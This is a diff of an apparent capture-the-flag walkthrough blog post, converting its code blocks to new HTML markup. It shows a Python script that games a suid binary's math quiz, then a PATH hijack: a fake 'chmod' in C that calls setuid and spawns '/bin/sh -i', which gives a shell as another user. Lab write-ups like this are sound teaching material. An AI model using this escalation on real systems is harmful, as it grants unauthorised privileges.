@@ -83,120 +83,213 @@
 
 <p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]$ ls -l
-total 20
-&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -l
+</span><span class='line'>total 20
+</span><span class='line'>---s--x--x <span class="m">1</span> george      george      <span class="m">5743</span> Jun <span class="m">19</span> 18:24 game
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>
 
 <!-- more -->
 
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ./game
-I&rsquo;m listening[/plain]</p>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game
+</span><span class='line'>I<span class="err">&#39;</span>m listening
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ss -lp
-State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
-LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
-LISTEN      0      128       :::sunrpc             :::<em>
-LISTEN      0      128       </em>:sunrpc              <em>:</em>
-LISTEN      0      128       :::http               :::<em>
-LISTEN      0      128       :::38035              :::</em>
-LISTEN      0      128       <em>:35380               </em>:<em>
-LISTEN      0      128       :::ssh                :::</em>
-LISTEN      0      128       <em>:ssh                 </em>:<em>
-LISTEN      0      10        </em>:1337                <em>:</em>
-LISTEN      0      20        ::1:smtp              :::<em>
-LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
-LISTEN      0      10        </em>:666                 <em>:</em>[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ss -lp
+</span><span class='line'>State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">50</span>        127.0.0.1:mysql       *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::sunrpc             :::*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:sunrpc              *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::http               :::*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::38035              :::*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:35380               *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::ssh                :::*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:ssh                 *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:1337                *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        ::1:smtp              :::*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        127.0.0.1:smtp        *:*
+</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:666                 *:*
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ telnet 127.0.0.1 1337
-Trying 127.0.0.1&hellip;
-Connected to 127.0.0.1.
-Escape character is &lsquo;^]&rsquo;.
-Type &lsquo;START&rsquo; to begin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
+</span><span class='line'>Trying 127.0.0.1...
+</span><span class='line'>Connected to 127.0.0.1.
+</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
+</span><span class='line'>
+</span><span class='line'>banana
+</span><span class='line'>No... START. S-T-A-R-T
+</span><span class='line'>
+</span><span class='line'>Connection closed by foreign host.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>banana
-No&hellip; START. S-T-A-R-T</p>
-
-<p>Connection closed by foreign host.[/plain]</p>
 
 <p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ telnet 127.0.0.1 1337
-Trying 127.0.0.1&hellip;
-Connected to 127.0.0.1.
-Escape character is &lsquo;^]&rsquo;.
-Type &lsquo;START&rsquo; to begin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
+</span><span class='line'>Trying 127.0.0.1...
+</span><span class='line'>Connected to 127.0.0.1.
+</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
+</span><span class='line'>
+</span><span class='line'>START
+</span><span class='line'>Starting...
+</span><span class='line'>
+</span><span class='line'>You have <span class="m">30</span> seconds to get as many points as you can, beat the high score! <span class="o">(</span>High Score: 133723<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Quick what<span class="s1">&#39;s... 924 x 541? Umm</span>
+</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">982</span> x 21? No idea
+</span><span class='line'>Quick what<span class="s1">&#39;s... 194 x 542? Really ?</span>
+</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">679</span> x 733? WHY WOULD I NEED TO KNOW THIS !?
+</span><span class='line'>Quick what<span class="s1">&#39;s... 960 x 248? I give up.</span>
+</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">718</span> x 646? THANKS OBAMA !
+</span><span class='line'>Quick what<span class="err">&#39;</span>s... <span class="m">162</span> x 784? ^C
+</span><span class='line'>Connection closed by foreign host
+</span></code></pre></td></tr></table></div></figure>
 
-<p>START
-Starting&hellip;</p>
-
-<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>
-
-<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
-Quick what&rsquo;s&hellip; 982 x 21? No idea
-Quick what&rsquo;s&hellip; 194 x 542? Really ?
-Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
-Quick what&rsquo;s&hellip; 960 x 248? I give up.
-Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
-Quick what&rsquo;s&hellip; 162 x 784? ^C
-Connection closed by foreign host[/plain]</p>
 
 <p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>
 
-<p>[python]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">1337</span><span class="p">))</span> <span class="c"># hardcoded IP address</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># login procedure</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span>
+</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s... (.*?)\?&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">l</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="n">d</span>
+</span><span class='line'>        <span class="k">break</span>
+</span><span class='line'>    <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">mul</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>!/usr/bin/python</h1>
-
-<p>import socket
-import re</p>
-
-<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
-s.recv(1024)
-s.send(&lsquo;START\n&rsquo;) # login procedure
-s.recv(110)
-while True:
-    d = s.recv(200)
-    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
-    if not l:
-        print d
-        break
-    (a,b) = l[0].split(&lsquo; x &rsquo;)
-    mul = int(a) * int(b)
-    print str(mul)
-    s.send(str(mul)+&lsquo;\n&rsquo;)</p>
-
-<p>print s.recv(1024)
-s.close()[/python]</p>
 
 <p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ python gamey3.py
-125451
-150858
-498300
-493353
-60564
-<strong><strong> SNIP </strong></strong>
-174386
-841312
-53636
-Final Score: 412619</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python gamey3.py
+</span><span class='line'>125451
+</span><span class='line'>150858
+</span><span class='line'>498300
+</span><span class='line'>493353
+</span><span class='line'>60564
+</span><span class='line'>**** SNIP ****
+</span><span class='line'>174386
+</span><span class='line'>841312
+</span><span class='line'>53636
+</span><span class='line'>Final Score: 412619
+</span><span class='line'>
+</span><span class='line'>!*!*!*!*! Congratulations, new high score <span class="o">(</span>412619<span class="o">)</span> !*!*!*!*!
+</span><span class='line'>
+</span><span class='line'>I hear the faint sound of chmodding.......
+</span></code></pre></td></tr></table></div></figure>
 
-<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>
-
-<p>I hear the faint sound of chmodding&hellip;&hellip;.[/plain]</p>
 
 <p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>
 
@@ -217,25 +310,35 @@ Final Score: 412619</p>
  setuid( 1000 );
  system(&ldquo;id&rdquo;);
  system( &ldquo;/bin/sh -i&rdquo; );
-}[/c]</p>
+}</p>
 
-<p>The path environment variable is modified to make /tmp the first location checked</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>The path environment variable is modified to make /tmp the first location checked
+</span></code></pre></td></tr></table></div></figure>
 
-<p>[plain gutter=&ldquo;false&rdquo;]$ PATH=/tmp:$PATH
+
+<p> bash
+$ PATH=/tmp:$PATH
 $ export | grep PATH
-export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;
-[/plain]</p>
+export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;</p>
 
-<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, hopefully, <span class="k">if</span> all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score <span class="o">(</span>I<span class="err">&#39;</span>m not going to show you again, just scroll up <span class="k">if</span> you want to see what it looks like<span class="o">)</span>.
+</span><span class='line'>
+</span><span class='line'>The score is beaten and we are indeed dropped to a new shell as the george user.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-$ ./game
+<p> bash</p>
+
+<p>$ ./game
 I&rsquo;m listening
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
-$
-[/plain]</p>
+$</p>
+
+<p>&#8220;`</p>
 
 <p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>
 </div>
